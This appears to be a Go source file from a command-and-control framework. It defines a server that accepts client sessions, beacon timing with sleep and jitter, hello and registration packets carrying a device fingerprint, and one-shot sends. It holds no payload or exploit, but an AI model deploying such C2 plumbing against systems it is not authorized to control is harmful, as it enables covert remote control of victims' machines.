package c2

import (
	"context"
	"errors"
	"io"
	"strings"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/device"
	"golang.org/x/xerrors"
)

const (
	// DefaultSleep is the default sleep Time when the provided sleep value
	// is empty or negative.
	DefaultSleep = time.Duration(30) * time.Second

	// DefaultJitter is the default Jitter value when the provided jitter
	// value is negative.
	DefaultJitter = 5

	// DefaultBufferSize is the default byte array size used when the
	// buffer size in a Profile is negative or zero.
	DefaultBufferSize = 4096

	// PacketPing is the packet ID value used by clients when no packets are
	// in the send or receive buffer. It's basically a NOP.
	PacketPing = 0xFD

	// PacketSleep is the packet ID value used by the server when no packets
	// are in the send or receive buffer. It's basically a NOP.
	PacketSleep = 0xFC

	// PacketHello is the packet ID value that is used when a client first
	// establishes it's first connection to the server.
	PacketHello = 0xFA

	// PacketMultiple is the packet ID value that is used when sending a multi
	// packet group.
	PacketMultiple = 0xFE

	// PacketShutdown is the packet ID value used to indicate that a client
	// should shut down and release resources. When received by a server session,
	// The serever will close it's end of the Session.
	PacketShutdown = 0xFF

	// PacketRegistered is the packet ID value expected on a successful
	// registration to the server.
	PacketRegistered = 0xFB

	maxEvents      = 256
	maxErrors int8 = 3
)

var (
	// Controller is the master list and manager for all C2 client connections.
	// The controller acts as staging point to control and manage all connections.
	Controller = NewServer("global", logx.NewConsole(logx.LInfo))

	// ErrFullBuffer is returned from the WritePacket function when the send buffer for
	// Session is full.
	ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")

	// DefaultWrapper is a raw Wrapper provided for use when
	// no Wrapper is provided.  This struct does not modify the
	// underlying streams and returns the paramater during a Wrap/Unwrap.
	DefaultWrapper = &rawWrapper{}

	// ErrEmptyPacket is a error returned by the Connect function when
	// the expected return result from the server was invalid or not expected.
	ErrEmptyPacket = errors.New("server sent an invalid response")

	// ErrNoConnector is a error returned by the Connect  and Listen functions when
	// the Connector is nil and the provided Profile is also nil or does not inherit
	// the Connector interface.
	ErrNoConnector = errors.New("invalid or missing connector")

	// DefaultTransform is a simple Transform instance that does not
	// make any changes to the underlying connection.  Used when no
	// Transform is given.
	DefaultTransform = &rawTransform{}

	// ErrInvalidNetwork is an error returned from the NewStreamConnector function
	// when a non-stream network is used, or the NewChunkConnector function when a stream
	// network is used.
	ErrInvalidNetwork = errors.New("invalid network type")

	// ErrInvalidPacketID is a error returned inside the client thread when the received packet
	// ID does not match the client ID and does not match any proxy client connected.
	ErrInvalidPacketID = errors.New("received a Packet ID that does not match our own ID")

	// ErrInvalidPacketCount is returned when attempting to read a packet marked
	// as multi or frag an the total count returned is zero.
	ErrInvalidPacketCount = errors.New("frag total is zero on a multi or frag packet")
)

// Server is a struct that helps manage and contain
// the sessions and processes events.
type Server struct {
	Log logx.Log

	ctx    context.Context
	name   string
	events chan *callback
	cancel context.CancelFunc
	active map[string]*Handle
}
type callback struct {
	session     *Session
	packet      *com.Packet
	sessionFunc func(*Session)
	packetFunc  func(*Session, *com.Packet)
}

// Profile is a struct that represents a C2 profile. This is used for
// defining the specifics that will be used to listen by servers and connect
// by clients.  Nil values (except for Connect), will be replaced with defaults.
// Profiles may also inherit the Connector interface for ease of use.
type Profile interface {
	Size() int
	Sleep() time.Duration
	Jitter() int8
	Wrapper() Wrapper
	Transform() Transform
}

// Connector is an interface that passes methods that can be used to form
// connections between the client and server.  Other functions include the
// process of listening and accepting connections.
type Connector interface {
	Listen(string) (Listener, error)
	Connect(string) (Connection, error)
}

// Listener is an interface that is used to Listen on a specific protocol
// for client connections.  The Listener does not take any actions on the clients
// but transcribes the data into bytes for the Session handler.  If the Transform()
// function returns nil, the DefaultTransform will be used.
type Listener interface {
	String() string
	Accept() (Connection, error)
	io.Closer
}

// Connection is an interface that represents a C2 connection
// between the client and the server.
type Connection interface {
	IP() string
	io.ReadWriteCloser
}
type clientConnector interface {
	Connect(string) (Connection, error)
}

// Wait will block until the current controller
// is closed and shutdown.
func (s *Server) Wait() {
	<-s.ctx.Done()
}
func (s *Server) process() {
	for s.ctx.Err() == nil {
		select {
		case <-s.ctx.Done():
			return
		case e := <-s.events:
			e.trigger(s)
		}
	}
}

// Close stops the processing thread from this Controller and
// releases all associated resources.
func (s *Server) Close() error {
	defer func() { recover() }()
	s.cancel()
	close(s.events)
	return nil
}

// IsActive returns true if this Controller is
// still able to send and receive Packets.
func (s *Server) IsActive() bool {
	return s.ctx.Err() == nil
}
func (e *callback) trigger(s *Server) {
	defer func(x *Server) {
		if err := recover(); err != nil {
			x.Log.Error("[%s] Controller recovered from a panic! (%s)", x.name, err)
		}
	}(s)
	if e.packet != nil && e.packetFunc != nil {
		e.packetFunc(e.session, e.packet)
	}
	if e.session != nil && e.sessionFunc != nil {
		e.sessionFunc(e.session)
	}
	e.packet = nil
	e.session = nil
	e.packetFunc = nil
	e.sessionFunc = nil
}

// NewServer creates a new Server instance for manageing C2
// clients and session. If needed the default "c2.Controller" is the
// recommended Server to use.
func NewServer(n string, l logx.Log) *Server {
	s := &Server{
		Log:    l,
		name:   n,
		active: make(map[string]*Handle),
		events: make(chan *callback, maxEvents),
	}
	s.ctx, s.cancel = context.WithCancel(context.Background())
	s.Log.Trace("[%s] Controller started...", n)
	go s.process()
	return s
}

// Listen adds the Listener under the name provided.  A Handle struct
// to control and receive callback functions is added to assist in
// manageing connections to this Listener.
func (s *Server) Listen(n, b string, v Connector, p Profile) (*Handle, error) {
	if v == nil {
		if x, ok := p.(Connector); ok {
			v = x
		} else {
			return nil, ErrNoConnector
		}
	}
	l, err := v.Listen(b)
	if err != nil {
		return nil, xerrors.Errorf("unable to listen on \"%s\": %w", b, err)
	}
	if l == nil {
		return nil, xerrors.Errorf("unable to listen on \"%s\"", b)
	}
	x := strings.ToLower(n)
	if _, ok := s.active[x]; ok {
		return nil, xerrors.Errorf("listener \"%s\" is already active", x)
	}
	h := &Handle{
		name:       x,
		listener:   l,
		sessions:   make(map[uint32]*Session),
		controller: s,
	}
	if p != nil {
		h.size = p.Size()
		h.Wrapper = p.Wrapper()
		h.Transform = p.Transform()
	}
	if h.size <= 0 {
		h.size = DefaultBufferSize
	}
	if h.Wrapper == nil {
		h.Wrapper = DefaultWrapper
	}
	if h.Transform == nil {
		h.Transform = DefaultTransform
	}
	h.close = make(chan uint32, h.size)
	h.ctx, h.cancel = context.WithCancel(s.ctx)
	s.active[x] = h
	s.Log.Debug("Added listener type \"%s\" as \"%s\"...", l.String(), strings.ToLower(n))
	go h.listen()
	return h, nil
}

// Connect creates a Session using the supplied Profile to connect to
// the listening server specified.
func (s *Server) Connect(a string, v clientConnector, p Profile) (*Session, error) {
	return s.ConnectWith(a, v, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT
// register the device with the controller.  This is used for spending specific data
// segments in single use connections.
func (s *Server) Oneshot(a string, v clientConnector, p Profile, d *com.Packet) error {
	if v == nil {
		if x, ok := p.(clientConnector); ok {
			v = x
		} else {
			return ErrNoConnector
		}
	}
	var w Wrapper
	var t Transform
	if p != nil {
		w = p.Wrapper()
		t = p.Transform()
	}
	if w == nil {
		w = DefaultWrapper
	}
	if t == nil {
		t = DefaultTransform
	}
	i, err := v.Connect(a)
	if err != nil {
		return xerrors.Errorf("unable to connect to \"%s\": %w", s, err)
	}
	defer i.Close()
	if d == nil {
		d = &com.Packet{ID: PacketPing}
	}
	d.Flags.Add(com.FlagOneshot)
	if err := write(i, w, t, d); err != nil {
		return xerrors.Errorf("unable to write packet: %w", err)
	}
	return nil
}

// ConnectWith creates a Session using the supplied Profile to connect to
// the listening server specified. This function allows for passing the data Packet
// specified to the server with the initial registration. The data will be passed on
// normally.
func (s *Server) ConnectWith(a string, v clientConnector, p Profile, d *com.Packet) (*Session, error) {
	if v == nil {
		if x, ok := p.(clientConnector); ok {
			v = x
		} else {
			return nil, ErrNoConnector
		}
	}
	x := DefaultBufferSize
	if p != nil && p.Size() > 0 {
		x = p.Size()
	}
	n := &Session{
		ID:         device.Local.ID[device.MachineIDSize:],
		send:       make(chan *com.Packet, x),
		recv:       make(chan *com.Packet, x),
		wake:       make(chan bool, 1),
		errors:     maxErrors,
		Device:     device.Local,
		server:     a,
		connect:    v.Connect,
		controller: s,
	}
	n.ctx, n.cancel = context.WithCancel(s.ctx)
	if p != nil {
		n.Sleep = p.Sleep()
		n.Jitter = p.Jitter()
		n.wrapper = p.Wrapper()
		n.transform = p.Transform()
	}
	if n.Sleep <= 0 {
		n.Sleep = DefaultSleep
	}
	if n.Jitter < 0 {
		n.Jitter = DefaultJitter
	}
	if n.wrapper == nil {
		n.wrapper = DefaultWrapper
	}
	if n.transform == nil {
		n.transform = DefaultTransform
	}
	i, err := v.Connect(a)
	if err != nil {
		return nil, xerrors.Errorf("unable to connect to \"%s\": %w", a, err)
	}
	defer i.Close()
	z := &com.Packet{ID: PacketHello}
	if err := n.Device.MarshalStream(z); err != nil {
		return nil, err
	}
	if d != nil {
		if err := d.MarshalStream(z); err != nil {
			return nil, err
		}
		z.Flags.Add(com.FlagData)
	}
	z.Close()
	if err := write(i, n.wrapper, n.transform, z); err != nil {
		return nil, xerrors.Errorf("unable to write packet: %w", err)
	}
	r, err := read(i, n.wrapper, n.transform)
	if err != nil {
		return nil, xerrors.Errorf("unable to read packet: %w", err)
	}
	if r.IsEmpty() || r.ID != PacketRegistered {
		return nil, ErrEmptyPacket
	}
	s.Log.Debug("[%s] Client connected to \"%s\"...", n.ID, a)
	go n.listen()
	return n, nil
}
